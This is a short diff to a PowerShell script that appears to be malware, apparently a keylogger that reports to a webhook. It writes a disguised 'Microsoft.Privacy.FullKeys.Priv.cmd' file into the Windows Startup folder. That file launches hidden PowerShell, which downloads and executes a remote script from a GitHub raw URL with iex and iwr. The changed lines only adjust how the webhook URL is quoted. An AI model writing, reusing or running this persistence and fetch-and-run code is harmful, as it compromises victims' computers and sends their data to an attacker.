@@ -1,4 +1,6 @@
 $webHookUrlPYTHON="'"+$webHookUrl+"'"
+$webHookUrlPYTHON2="""$webHookUrl"""
+$webHookUrlPYTHON3="'"+$webHookUrlPYTHON2+"'"
 $webHookUrl2="$"+"webHookUrl"
 
 New-Item "C:\temp" -Type Directory
@@ -65,9 +67,8 @@ if __name__ == '__main__':
 ##### STARTUP FONCTION
 Set-Content "C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Microsoft.Privacy.FullKeys.Priv.cmd" "
 @echo off
-powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON;iex((iwr https://raw.githubusercontent.com/Appolon24800/Appolon-KIT-Public/main/g.ps1).content)
+powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON3;iex((iwr https://raw.githubusercontent.com/Appolon24800/Appolon-KIT-Public/main/g.ps1).content)
 "
-
 ##### END STARTUP FONCTION
 
 cls
